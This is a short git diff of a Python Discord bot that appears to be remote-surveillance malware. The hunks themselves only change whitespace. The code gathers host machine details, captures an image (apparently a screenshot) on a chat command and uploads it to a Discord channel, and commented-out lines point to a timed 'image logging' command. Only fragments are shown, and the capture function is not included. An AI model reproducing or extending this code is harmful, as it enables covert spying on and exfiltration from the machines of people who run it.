@@ -6,14 +6,15 @@ import platform
 import sys
 import threading
 
+
 bot_token = ""
+
 
 machine_data = platform.uname()
 
 def init_bot(token):
     global bot_token
     bot_token = token
-
 
 e_bot = discord.Client()
 f_imglog = False
@@ -43,11 +44,11 @@ async def on_message(message):
             
             print(path)
 
-            if collectimage():
-                await e_bot.send_file(message.channel,path+'tempic.png')
-            else:
-                await e_bot.send_message(message.channel,"[Error] : Couldn't grab pic :( ")
-    
+        if collectimage():
+            await e_bot.send_file(message.channel,path+'tempic.png')
+        else:
+            await e_bot.send_message(message.channel,"[Error] : Couldn't grab pic :( ")
+
     #elif  message.content.startswith('$startimglog'):
      #   f_imglog = True
       #  threading.Timer(interval_imglog,startimglog)
